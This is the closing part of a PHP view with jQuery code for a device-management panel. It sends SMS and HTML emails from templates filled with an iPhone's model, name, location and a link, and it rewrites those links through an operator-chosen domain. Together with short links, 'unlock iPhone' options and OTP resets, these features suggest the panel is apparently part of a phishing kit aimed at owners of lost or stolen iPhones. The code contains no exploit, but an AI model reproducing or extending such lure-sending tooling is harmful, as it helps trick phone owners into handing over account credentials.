<script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-tagsinput/0.8.0/bootstrap-tagsinput.js"></script>
<script src="<?php echo base_url();?>/public/assets/server/js/equipos/ingresados.js"></script>
<script src="<?php echo base_url();?>/public/assets/server/js/equipos/sendsms.js"></script>
<script src="<?php echo base_url();?>/public/assets/server/js/equipos/callcenter.js"></script>
<script src="<?php echo base_url();?>/public/assets/server/js/sms-counter.min.js"></script>

<!--<script src="<?php //echo base_url();?>/public/assets/server/js/notificaciones.js"></script>-->
</script>
<script>
   let dominio  = "<?=$server['dominio']?>";
   let urlacortada_temp = '';
   let link_short_temp  = '';
   let link_long_temp   = '';
   let modelo_temp      = '';
   let niphone_temp     = '';
   let date_temp        = "<?=date("Y-m-d H:i:s")?>"
   let sid              = '';


   $(document).ready(function() {
       allsenderid($("#id_apisms_sender").val())
       allsenderidEdit($("#id_apisms").val())
       view_audios($("#audios").val())
   
      setTimeout(function(){
        $(".theme-loader").fadeOut("slow");           
      }, 500)
   
      $("#title").html($("#title").html() + " .::. Ingresados")
   
      $(".li-ingresados").addClass('active')
      $(".li-equipos").addClass('active')
      $(".nav-treeview-equipos").css('display','block') 
   
   
   });

  $("#id_apisms_sender").on('change', function(){

     allsenderid($("#id_apisms_sender").val())

  })
   

   function allsenderid(id_apisms){
      
     let data_form = {
         id_apisms : id_apisms
     } 

    $.ajax({
     
      url:"/configurar/smsapi/getsendersid",
      type:"POST",
      data:data_form,
      dataType: 'json',
      success:function(resp){
          $("#sender_id").html('');
          $.each(resp, function(index, value){

             $("#sender_id").append("<option value = "+value.idsender+">"+value.descripcion_cliente+"</option>")
          })        

      } 
    })  

   }

$("#id_apisms").on('change', function(){
  
   allsenderidEdit($("#id_apisms").val())

})


function allsenderidEdit(id_apisms){
      
     let data_form = {
         id_apisms : id_apisms
     } 

    $.ajax({
     
      url:"/configurar/smsapi/getsendersid",
      type:"POST",
      data:data_form,
      dataType: 'json',
      success:function(resp){
          $("#idsender").html('');
          $.each(resp, function(index, value){

             $("#idsender").append("<option value = "+value.idsender+">"+value.descripcion_cliente+"</option>")
          })        

      } 
    })  

   }   

   
    $(".codeunlock").on('change', function() {
      if($(this).is(':checked') ) {
        $('.codeunlockiphone').removeAttr("disabled")
      }else{
        $('.codeunlockiphone').attr("disabled", true);
        $('.codeunlockiphone').prop('checked', false);
      }
   });

   $(function () {
     //Enable check and uncheck all functionality
     $('.checkbox-toggle').click(function () {
       var clicks = $(this).data('clicks')
       if (clicks) {
         //Uncheck all checkboxes
         $('.tablaequipos input[type=\'checkbox\']').prop('checked', false)
         $('.checkbox-toggle i').removeClass('fa-check-square').addClass('fa-square')
        
       } else {
         //Check all checkboxes
         $('.tablaequipos input[type=\'checkbox\']').prop('checked', true)
         $('.checkbox-toggle i').removeClass('fa-square').addClass('fa-check-square')
        
       }
       $(this).data('clicks', !clicks)
      })
     })
   

   
   
   
   
   $("#selectaplant").change(function() {
   
   
    var data_form = {
      descripsms    : $("#selectaplant").val(),
      modelo       : $("#modelo").val(),
      linkg        : $("#linkg").val(),
      nombreIphone : $("#nombreIphone").val()
   } 
   
   
   
   $.ajax({
     url:"selectplantilla",
     type:"POST",
     data:data_form,
      dataType: 'json',
     success:function(res){
   
       if(res['descripcion'] == "selectaplant"){
          $("#descripcionarea").val("");
       }else{
         
          
          $("#descripcionarea").val(res['descripcion'])
          $("#descripcionarea").focus();
          
          
       }
   
       
             
     }
   }) 
   
    
   });
   
   $(document).on("submit", ".form-sendsms", function(event){
   
    event.preventDefault();
   
     $("#reloadsendsms").html('<img src="../public/assets/server/img/loading.gif"  />')
     
   
   
   
     
   
     var data_form = {
   
         selectapicall   : $("#selectapicall").val(),
         prefijo         : $("#miprefijo").val(),
         numero          : $("#numero").val(),
         descripcion     : $("#descripcionarea").val(),
         linkg           : $("#linkg").val(),
         remitenteselect : $("#remitenteselect").val(),
         ideq            : $("#ideq").val(),
         servicio        : $("#servicio").val(),
         cantidadSMS     : parseInt($("#cantidadsms").html()),
         sender_id       : $("#sender_id").val()
     }
   
     if(data_form.selectapicall == "selectapisms"){
   
      $("#reloadsendsms").html("<span style = 'color : red';>Debe seleccionar una opción valida.</span>");
   
     }else if(data_form.prefijo == "paisesnull"){
   
        $("#reloadsendsms").html("<span style = 'color : red';>Debe seleccionar una opción valida.</span>");
   
     }else{
   
   
       var url_php = '../api/sms/Sendsms/enviarsms';
       $.ajax({
           type:'POST',
           url: url_php,
           data: data_form,
           dataType: 'json',
           async: true,
       }).done(function ajaxDone(res){
         
        if(res.status == true){
   
          $("#reloadsendsms").html("<span style = 'color : green';>Mensaje enviado exitosamente</span>"); 
          $("#sender_id_div").hide();
          $("#sender_id_div").prop('selectedIndex',0);
         
   
          $("#cantidadsmsicon").html(res.cantidadsms); 
   
         }else if(res.status == false && res.credito == true ){
   
          $("#reloadsendsms").html("<span style = 'color : red';>No se pudo enviar el Mensaje.<br>Consulta a su administrador.</span>"); 
   
           
   
         }else if(res.status == false && res.credito == false ){
   
           $("#reloadsendsms").html("<span style = 'color : red';>No dispones de mensajes suficientes.<br>Consulta a su administrador.</span>"); 
   
          $(".form-sendsms")[0].reset(); 
   
           
   
         }
   
       }).fail(function ajaxError(e){
         console.log(e);
       }).always(function ajaxSiempre(){
           // console.log('Final de la llamada ajax.');
       })
        return false;
   
     }
   
   
     
     
   
     
   })
   
   
   
   /*****************Email Sender**********************/
   
   $("#selectaplantemail").change(function() {
   var valor = $(this).val(); // Capturamos el valor del select
   var texto = $(this).find('option:selected').text(); // Capturamos el texto del option seleccionado
    $(".editableHTML").text('<div class="loader-block" style="margin-top: 70px;"><svg id="loader2" viewBox="0 0 100 100"><circle id="circle-loader2" cx="50" cy="50" r="45"></circle></svg></div>');
    var data_form = {
      id                : valor,
      modeloemail       : $("#modeloemail").val(),
      linkgemail        : $("#linkgemail").val(),
      nombreIphoneemail : $("#nombreIphoneemail").val(),
      ubicacionemail    : $("#ubicacionemail").val()
   
   }   
   
   
   $.ajax({
     url:"../configurar/Emailplantillas/leerHTML",
     type:"POST",
     data:data_form,
      dataType: 'json',
      beforeSend: function(){
   
         $(".note-editable").html('');
   
      },
      success:function(res){
          $(".note-editable").html('');
   
   
       if(res.contenido == "selectaplant"){
         $(".note-editable").html('');
       }else{
   
           const v = res.contenido;
           const regex = $("#linkgemail").val();
           var contenido = v.replace(regex, "https://"+$("#selectdomainsemail").val()+"?url="+$("#linkgtipo").val());
   
          $(".note-editable").html(contenido);
       }
             
     }
   }) 
   
    
   });
   
   
   $(document).on("submit", ".form-sendemailsender", function(event){
   
    event.preventDefault();
   
    
     $(".btnsendemail").attr('disabled','true');
     const Toast = Swal.mixin({
       toast: true,
       position: 'top-end',
       showConfirmButton: false,
       timer: 3000
     });
   
     var data_form = {   
         servidorsmtp    : $("#servidorsmtp").val(), 
         apismtp         : $("#apismtp").val(),
         remitenteemail  : $("#remitenteemail").val(),
         asuntoemail     : $("#asuntoemail").val(),
         emailTo         : $("#emailTo").val(),
         linkgemail      : $("#linkgemail").val(),
         domainsemail    : $("#selectdomainsemail").val(),
         msg             : $(".note-editable").html()
        
     }
   
       var url_php = '../api/email/Sendemail/enviaremail';
       $.ajax({
           type:'POST',
           url: url_php,
           data: data_form,
           dataType: 'json',
           async: true,
           beforeSend: function(){
              $("#reloagif").html('<img src="../public/assets/server/img/loading.gif">');
           },
       }).done(function ajaxDone(res){
   
         console.log(res)
   
   
            $(".btnsendemail").removeAttr('disabled');
             $("#reloagif").html('');
            if(res.status == true){
                Toast.fire({
                 type: 'success',
                 title: '&nbsp; Correo enviado con exito.'
               })
            }
   
       }).fail(function ajaxError(e){
         console.log(e);
       }).always(function ajaxSiempre(){
           // console.log('Final de la llamada ajax.');
       })
        return false;
   
     
   })
   
   
   
   function abrirmodalsmsinfo(){
     
     
   }  
   
   
   $("#selectapicall").on('change', function(){
     if($("#selectapicall").val() == "sender_global"){
         $("#sender_id_div").show();
     }else{
         $("#sender_id_div").hide();
         $("#sender_id_div").prop('selectedIndex',0);
     }
     
     
     
   })



$("#modelo").change(function () {

   if ($("#modelo").val() == "otro") {

      $("#form-group-modelo").show();
      $("#modeloinput").focus();

   } else {

      $("#form-group-modelo").hide();
      $("#modeloinput").val("")

   }

})


function resetear_otp(){

   const Toast = Swal.mixin({
      toast: true,
      position: 'top-end',
      showConfirmButton: false,
      timer: 3000
   });

   let datos = {
      idequipos : $("#idequipo").val()
   }


   var url_php = '../api_rest/reset_otp'
    $.ajax({
       type:'POST',
       url: url_php,
       data: datos,
       dataType: 'json',
       async: true,
       beforeSend: function(){
          
       },
    }).done(function ajaxDone(resp){ 
       
       if(resp['status'] == true){
         Toast.fire({
            type: 'success',
            title: '&nbsp; Configuración OTP resetada.'
         })
       }else{
          Toast.fire({
            type: 'error',
            title: '&nbsp; Configuración OTP resetada.'
         })
       }
       
       allingresados("");


     })



}


   
   
   
   
   
   
</script>
</body>
</html>
